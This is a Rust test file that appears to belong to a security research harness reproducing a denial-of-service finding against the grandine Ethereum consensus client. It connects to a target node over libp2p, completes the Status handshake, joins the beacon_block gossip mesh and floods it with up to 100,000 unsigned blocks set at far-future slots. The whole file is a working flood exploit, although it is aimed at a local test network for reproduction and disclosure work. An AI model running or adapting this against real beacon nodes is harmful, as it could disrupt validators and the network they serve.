// Live libp2p reproduction of grandine PROP-val-eth-003.
//
// This test is meant to be copied into grandine/eth2_libp2p/tests/ by
// harness.probes.grandine_libp2p_attack. It reuses grandine's own eth2_libp2p
// stack, dials the Kurtosis grandine node, completes Status, joins the
// beacon_block mesh, and floods future-slot Fulu blocks with unique graffiti.
//
// Required env:
//   GR_CFG=/tmp/grandine-netcfg
//   GR_TARGET=/ip4/127.0.0.1/tcp/<port>/p2p/<peer_id>
//
// Optional env:
//   GR_SLOT_OFFSET=1000000
//   GR_FLOOD=100000
//   GR_WARMUP=12

#![allow(unused)]

use std::sync::Arc;
use std::time::{Duration, Instant};

use eth2_libp2p::rpc::methods::{StatusMessage, StatusMessageV2};
use eth2_libp2p::rpc::RequestType;
use eth2_libp2p::service::api_types::AppRequestId;
use eth2_libp2p::types::{GossipEncoding, GossipKind, GossipTopic, PubsubMessage};
use eth2_libp2p::{Multiaddr, NetworkEvent, Response};
use types::combined::SignedBeaconBlock as CombinedSignedBeaconBlock;
use types::config::Config;
use types::phase0::primitives::H256;
use types::preset::Mainnet;

type P = Mainnet;

fn env_u64(key: &str, default: u64) -> u64 {
    std::env::var(key)
        .ok()
        .and_then(|s| s.parse().ok())
        .unwrap_or(default)
}

fn load_config() -> Arc<Config> {
    let dir = std::env::var("GR_CFG").expect("GR_CFG=/path/to/network-configs");
    let bytes = std::fs::read(format!("{dir}/config.yaml")).expect("read config.yaml");
    let config: Config = serde_yaml::from_slice(&bytes).expect("parse config.yaml");
    Arc::new(config)
}

fn genesis_validators_root() -> H256 {
    let dir = std::env::var("GR_CFG").expect("GR_CFG=/path/to/network-configs");
    let s = std::fs::read_to_string(format!("{dir}/genesis_validators_root.txt"))
        .expect("read genesis_validators_root.txt");
    s.trim()
        .trim_start_matches("0x")
        .parse()
        .expect("gvr hex")
}

fn future_block(
    template: &Arc<CombinedSignedBeaconBlock<P>>,
    slot: u64,
    idx: u32,
) -> Arc<CombinedSignedBeaconBlock<P>> {
    let mut graffiti = [0u8; 32];
    graffiti[..4].copy_from_slice(&idx.to_le_bytes());
    match template.as_ref() {
        CombinedSignedBeaconBlock::Fulu(block) => {
            let mut signed = block.clone();
            signed.message.slot = slot;
            signed.message.body.graffiti = graffiti.into();
            signed.signature = Default::default();
            Arc::new(CombinedSignedBeaconBlock::Fulu(signed))
        }
        CombinedSignedBeaconBlock::Electra(block) => {
            let mut signed = block.clone();
            signed.message.slot = slot;
            signed.message.body.graffiti = graffiti.into();
            signed.signature = Default::default();
            Arc::new(CombinedSignedBeaconBlock::Electra(signed))
        }
        other => panic!("unsupported live template phase for attack: {other:?}"),
    }
}

fn react(
    attacker: &mut crate::common::Libp2pInstance<P>,
    ev: &NetworkEvent<P>,
    cached: &mut Option<StatusMessage>,
    sent_status: &mut bool,
    template: &mut Option<Arc<CombinedSignedBeaconBlock<P>>>,
) {
    match ev {
        NetworkEvent::RequestReceived {
            peer_id,
            inbound_request_id,
            request_type,
        } => {
            if let RequestType::Status(their) = request_type {
                eprintln!("[hs] <- Status from grandine: {their:?}");
                attacker.send_response(*peer_id, *inbound_request_id, Response::Status(their.clone()));
                *cached = Some(their.clone());
                if !*sent_status {
                    let _ = attacker.send_request(
                        *peer_id,
                        AppRequestId::Application(1),
                        RequestType::Status(their.clone()),
                    );
                    *sent_status = true;
                    eprintln!("[hs] -> reciprocated Status");
                }
            }
        }
        NetworkEvent::StatusPeer(peer_id) => {
            if let Some(status) = cached.clone() {
                let _ = attacker.send_request(
                    *peer_id,
                    AppRequestId::Application(1),
                    RequestType::Status(status),
                );
                *sent_status = true;
                eprintln!("[hs] -> Status (on StatusPeer)");
            }
        }
        NetworkEvent::PeerDisconnected(peer_id) => {
            eprintln!("[hs] !! grandine disconnected us: {peer_id}");
        }
        NetworkEvent::PubsubMessage { topic, source, message, .. } => {
            if let PubsubMessage::BeaconBlock(block) = message {
                *template = Some(block.clone());
            }
            eprintln!("[gossip] <- {topic:?} from {source}");
        }
        _ => {}
    }
}

#[tokio::test]
#[ignore]
async fn flood_far_future_beacon_blocks() {
    let config = load_config();
    let gvr = genesis_validators_root();
    let slot_offset = env_u64("GR_SLOT_OFFSET", 1_000_000);
    let flood = env_u64("GR_FLOOD", 100_000) as usize;
    let batch = env_u64("GR_BATCH", 5_000) as usize;
    let batch_sleep_ms = env_u64("GR_BATCH_SLEEP_MS", 5);

    for (name, epoch) in [
        ("genesis", 0u64),
        ("fulu", config.fulu_fork_epoch),
        ("electra", config.electra_fork_epoch),
    ] {
        let digest = helper_functions::misc::compute_fork_digest(&config, gvr, epoch);
        eprintln!("[digest] {name}@{epoch} = {digest:?}");
    }

    let mut attacker = crate::common::build_attacker_instance::<P>(&config, gvr).await;
    let target: Multiaddr = std::env::var("GR_TARGET")
        .expect("GR_TARGET=/ip4/127.0.0.1/tcp/<port>/p2p/<peer_id>")
        .parse()
        .expect("valid multiaddr");
    attacker.testing_dial(target).expect("dial target");

    let mut cached: Option<StatusMessage> = None;
    let mut sent_status = false;
    let mut template: Option<Arc<CombinedSignedBeaconBlock<P>>> = None;
    let peer_id = loop {
        let ev = attacker.next_event().await;
        react(&mut attacker, &ev, &mut cached, &mut sent_status, &mut template);
        if let NetworkEvent::PeerConnectedOutgoing(peer_id) = ev {
            break peer_id;
        }
    };
    eprintln!("[*] connected to {peer_id}; subscribing to beacon_block");
    attacker.subscribe_kind(GossipKind::BeaconBlock);

    let status = StatusMessage::V2(StatusMessageV2 {
        fork_digest: helper_functions::misc::compute_fork_digest(
            &config,
            gvr,
            config.fulu_fork_epoch,
        ),
        finalized_root: H256::zero(),
        finalized_epoch: 0,
        head_root: H256::zero(),
        head_slot: 0,
        earliest_available_slot: 0,
    });
    let _ = attacker.send_request(
        peer_id,
        AppRequestId::Application(1),
        RequestType::Status(status.clone()),
    );
    cached = Some(status);
    sent_status = true;
    eprintln!("[hs] -> proactive Status sent to {peer_id}");

    let warmup = Instant::now();
    let warmup_secs = env_u64("GR_WARMUP", 12);
    let topic = GossipTopic::new(
        GossipKind::BeaconBlock,
        GossipEncoding::default(),
        helper_functions::misc::compute_fork_digest(&config, gvr, config.fulu_fork_epoch),
    );
    let topic_hash = libp2p::gossipsub::IdentTopic::from(topic.clone()).hash();
    let mut max_mesh_peers = 0usize;
    while warmup.elapsed() < Duration::from_secs(warmup_secs) {
        if let Ok(ev) =
            tokio::time::timeout(Duration::from_millis(100), attacker.next_event()).await
        {
            eprintln!("[warmup-ev] {ev:?}");
            react(&mut attacker, &ev, &mut cached, &mut sent_status, &mut template);
        }
        let mesh_peers = attacker.gossipsub().mesh_peers(&topic_hash).count();
        max_mesh_peers = max_mesh_peers.max(mesh_peers);
        if mesh_peers > 0 && template.is_some() {
            break;
        }
    }
    let mesh_peers = attacker.gossipsub().mesh_peers(&topic_hash).count();
    let template = template.expect("did not receive a live beacon_block template during warmup");
    eprintln!(
        "[*] warmup done (status_sent={sent_status}, cached={}, mesh_peers={mesh_peers}, max_mesh_peers={max_mesh_peers}); flooding {flood} blocks at slot +{slot_offset}",
        cached.is_some(),
    );

    let far_slot = 1_000 + slot_offset;
    let mut ignored_template: Option<Arc<CombinedSignedBeaconBlock<P>>> = None;
    for i in 0..flood {
        attacker.publish(PubsubMessage::BeaconBlock(future_block(&template, far_slot, i as u32)));
        for _ in 0..3 {
            let ev_opt = match futures::poll!(std::pin::pin!(attacker.next_event())) {
                std::task::Poll::Ready(ev) => Some(ev),
                std::task::Poll::Pending => None,
            };
            if let Some(ev) = ev_opt {
                react(&mut attacker, &ev, &mut cached, &mut sent_status, &mut ignored_template);
            }
        }
        if i % batch == 0 {
            eprintln!("[attack] published {i}");
            tokio::time::sleep(Duration::from_millis(batch_sleep_ms)).await;
        }
    }

    eprintln!("[attack] published {flood}; draining 20s so messages transmit");
    let drain = Instant::now();
    while drain.elapsed() < Duration::from_secs(20) {
        if let Ok(ev) =
            tokio::time::timeout(Duration::from_millis(100), attacker.next_event()).await
        {
            react(&mut attacker, &ev, &mut cached, &mut sent_status, &mut ignored_template);
        }
    }
}
